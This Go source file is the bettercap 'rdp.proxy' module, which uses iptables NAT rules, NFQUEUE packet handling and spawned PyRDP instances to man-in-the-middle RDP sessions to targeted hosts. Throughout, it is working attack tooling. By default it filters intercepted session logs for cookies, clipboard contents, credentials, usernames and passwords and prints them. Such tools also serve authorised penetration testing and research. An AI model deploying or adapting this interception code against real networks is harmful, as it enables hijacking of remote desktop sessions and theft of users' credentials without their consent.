package rdp_proxy

import (
    "fmt"
    "os/exec"
    "io/ioutil"
    golog "log"
    "net"
    "syscall"
    "bufio"
    "io"
    "regexp"
    "bytes"

    "github.com/bettercap/bettercap/core"
    "github.com/bettercap/bettercap/network"
    "github.com/bettercap/bettercap/session"

    "github.com/chifflier/nfqueue-go/nfqueue"
    "github.com/google/gopacket"
    "github.com/google/gopacket/layers"
)

type RdpProxy struct {
    session.SessionModule
    targets   []net.IP
    done      chan bool
    queue     *nfqueue.Queue
    queueNum  int
    port      int
    startPort int
    cmd       string
    regexp    string
    compiled  *regexp.Regexp
    active    map[string]exec.Cmd
}

var mod *RdpProxy

func NewRdpProxy(s *session.Session) *RdpProxy {
    mod = &RdpProxy{
        SessionModule: session.NewSessionModule("rdp.proxy", s),
        targets:       make([]net.IP, 0),
        done:          make(chan bool),
        queue:         nil,
        queueNum:      0,
        port:          3389,
        startPort:     40000,
        cmd:           "pyrdp-mitm.py",
        regexp:        "(?i)(cookie:|mstshash=|clipboard data|client info|credential|username|password)",
        active:        make(map[string]exec.Cmd),
    }

    mod.AddHandler(session.NewModuleHandler("rdp.proxy on", "", "Start the RDP proxy.",
        func(args []string) error {
            return mod.Start()
        }))

    mod.AddHandler(session.NewModuleHandler("rdp.proxy off", "", "Stop the RDP proxy.",
        func(args []string) error {
            return mod.Stop()
        }))

mod.AddParam(session.NewIntParameter("rdp.proxy.queue.num", "0", "NFQUEUE number to bind to."))
mod.AddParam(session.NewIntParameter("rdp.proxy.port", "3389", "RDP port to intercept."))
mod.AddParam(session.NewIntParameter("rdp.proxy.start", "40000", "Starting port for PyRDP sessions."))
mod.AddParam(session.NewStringParameter("rdp.proxy.command", "pyrdp-mitm.py", "", "The PyRDP base command to launch the man-in-the-middle."))
mod.AddParam(session.NewStringParameter("rdp.proxy.out", "./", "", "The output directory for PyRDP artifacts."))
mod.AddParam(session.NewStringParameter("rdp.proxy.targets", session.ParamSubnet, "", "Comma separated list of IP addresses to proxy to, also supports nmap style IP ranges."))
mod.AddParam(session.NewStringParameter("rdp.proxy.regexp", "(?i)(cookie:|mstshash=|clipboard data|client info|credential|username|password)", "", "Print PyRDP logs matching this regular expression."))
    return mod
}

func (mod RdpProxy) Name() string {
    return "rdp.proxy"

}

func (mod RdpProxy) Description() string {
    return "A Linux-only module that relies on NFQUEUEs and PyRDP in order to man-in-the-middle RDP sessions."
}

func (mod RdpProxy) Author() string {
    return "Alexandre Beaulieu <alex@segfault.me> && Maxime Carbonneau <pourliver@gmail.com>"
}

func (mod *RdpProxy) isTarget(ip string) bool {

    for _, addr := range mod.targets {
        if addr.String() == ip {
            return true
        }
    }

    return false
}

// Filter PyRDP logs to only show those that matches mod.regexp
func (mod *RdpProxy) filterLogs(prefix string, output io.ReadCloser) {
    scanner := bufio.NewScanner(output)

    // For every log in the queue
    for scanner.Scan() {
        text := scanner.Bytes()
        if mod.compiled == nil || mod.compiled.Match(text) {
            // Extract the meaningful part of the log
            chunks := bytes.Split(text, []byte(" - "))

            // Get last element
            data := chunks[len(chunks) - 1]

            mod.Info("%s %s", prefix, data)
        }
    }
}

// Adds the firewall rule for proxy instance.
func (mod *RdpProxy) doProxy(addr string, port string, enable bool) (err error) {
    _, err = core.Exec("iptables", []string{
        "-t", "nat",
        "-I", "BCAPRDP", "1",
        "-d", addr,
        "-p", "tcp",
        "--dport", fmt.Sprintf("%d", mod.port),
        "-j", "REDIRECT",
        "--to-ports", port,
    })
    return
}

func (mod *RdpProxy) doReturn(dst string, dport gopacket.Endpoint, enable bool) (err error) {
    _, err = core.Exec("iptables", []string{
        "-t", "nat",
        "-I", "BCAPRDP", "1",
        "-p", "tcp",
        "-d", dst,
        "--dport", fmt.Sprintf("%v", dport),
        "-j", "RETURN",
    })
    return
}

func (mod *RdpProxy) configureFirewall(enable bool) (err error) {
    rules := [][]string{}

    if enable {
        rules = [][]string{
            { "-t", "nat", "-N", "BCAPRDP" },
            { "-t", "nat", "-I", "PREROUTING", "1", "-j", "BCAPRDP" },
            { "-t", "nat", "-A", "BCAPRDP",
                "-p", "tcp", "-m", "tcp", "--dport", fmt.Sprintf("%d", mod.port),
                "-j", "NFQUEUE", "--queue-num", fmt.Sprintf("%d", mod.queueNum), "--queue-bypass",
            },
        }

    } else if !enable {
        rules = [][]string{
            { "-t", "nat", "-D", "PREROUTING", "-j", "BCAPRDP" },
            { "-t", "nat", "-F", "BCAPRDP" },
            { "-t", "nat", "-X", "BCAPRDP" },
        }
    }

    for _, rule := range rules {
        if _, err = core.Exec("iptables", rule); err != nil {
            return err
        }
    }

    return
}

func (mod *RdpProxy) Configure() (err error) {
    var targets string

    golog.SetOutput(ioutil.Discard)
    mod.destroyQueue()

    // TODO: Param validation and hydration
    if err, mod.port = mod.IntParam("rdp.proxy.port"); err != nil {
        return
    } else if err, mod.cmd = mod.StringParam("rdp.proxy.command"); err != nil {
        return
    } else if err, mod.queueNum = mod.IntParam("rdp.proxy.queue.num"); err != nil {
        return
    } else if err, targets = mod.StringParam("rdp.proxy.targets"); err != nil {
        return
    } else if mod.targets, _, err = network.ParseTargets(targets, mod.Session.Lan.Aliases()); err != nil {
        return
    } else if err, mod.regexp = mod.StringParam("rdp.proxy.regexp"); err != nil {
        return
    } else if mod.regexp != "" {
        if mod.compiled, err = regexp.Compile(mod.regexp); err != nil {
            return
        }
    } else if _, err = exec.LookPath(mod.cmd); err != nil {
        return
    }

    mod.Info("Starting RDP Proxy")
    mod.Debug("Targets=%v", mod.targets)

    // Create the NFQUEUE handler.
    mod.queue = new(nfqueue.Queue)
    if err = mod.queue.SetCallback(OnRDPConnection); err != nil {
        return
    } else if err = mod.queue.Init(); err != nil {
        return
    } else if err = mod.queue.Unbind(syscall.AF_INET); err != nil {
        return
    } else if err = mod.queue.Bind(syscall.AF_INET); err != nil {
        return
    } else if err = mod.queue.CreateQueue(mod.queueNum); err != nil {
        return
    } else if err = mod.queue.SetMode(nfqueue.NFQNL_COPY_PACKET); err != nil {
        return
    } else if err = mod.configureFirewall(true); err != nil {
        return
    }
    return nil
}

// Note: It is probably a good idea to verify whether this call is serialized.
func (mod *RdpProxy) handleRdpConnection(payload *nfqueue.Payload) int {
    // 1. Determine source and target addresses.
    p := gopacket.NewPacket(payload.Data, layers.LayerTypeIPv4, gopacket.Default)
    src, sport := p.NetworkLayer().NetworkFlow().Src(), p.TransportLayer().TransportFlow().Src()
    dst, dport := p.NetworkLayer().NetworkFlow().Dst(), p.TransportLayer().TransportFlow().Dst()

    ips := fmt.Sprintf("[%v:%v -> %v:%v]", src, sport, dst, dport)

    if mod.isTarget(dst.String()) {
        target := fmt.Sprintf("%v:%v", dst, dport)

        // 2. Check if the destination IP already has a PyRDP session active, if so, do nothing.
        if _, ok :=  mod.active[target]; !ok {
            // 3.1. Otherwise, create a proxy agent and firewall rules.
            args := []string{
                "-l", fmt.Sprintf("%d", mod.startPort),
                // "-o", mod.outpath,
                // "-i", "-d"
                target,
            }

            //   3.2. Spawn PyRDP proxy instance
            cmd := exec.Command(mod.cmd, args...)
            stderrPipe, _ := cmd.StderrPipe()

            if err := cmd.Start(); err != nil {
                // XXX: Failed to start the rdp proxy... accept connection transparently and log?
            }

            // Use goroutines to keep logging each instance of PyRDP
            go mod.filterLogs(ips, stderrPipe)

            //   3.3. Add a NAT rule in the firewall for this particular target IP
            mod.doProxy(dst.String(), fmt.Sprintf("%d", mod.startPort), true)
            mod.active[target] = *cmd
            mod.startPort += 1
        }
    } else {
        mod.Info("Non-target, won't intercept %s", ips)

        // Add an exception in the firewall to avoid intercepting packets to this destination and port
        mod.doReturn(dst.String(), dport, true)
    }

    // Force a retransmit to trigger the new firewall rules. (TODO: Find a more efficient way to do this.)
    payload.SetVerdict(nfqueue.NF_DROP)

    return 0
}

// NFQUEUE needs a raw function.
func OnRDPConnection(payload *nfqueue.Payload) int {
    return mod.handleRdpConnection(payload)
}

func (mod *RdpProxy) Start() error {
    if mod.Running() {
        return session.ErrAlreadyStarted(mod.Name())
    } else if err := mod.Configure(); err != nil {
        return err
    }

    return mod.SetRunning(true, func() {
        mod.Info("started on queue number %d", mod.queueNum)

        defer mod.destroyQueue()

        mod.queue.Loop()

        mod.done <- true
    })
}

func (mod *RdpProxy) Stop() error {
    return mod.SetRunning(false, func() {
        mod.queue.StopLoop()
        mod.configureFirewall(false)
        for _, cmd := range mod.active {
            cmd.Process.Kill() // FIXME: More graceful way to shutdown proxy agents?
        }

        <-mod.done
    })
}

func (mod *RdpProxy) destroyQueue() {
    if mod.queue == nil {
        return
    }

    mod.queue.DestroyQueue()
    mod.queue.Close()
    mod.queue = nil
}
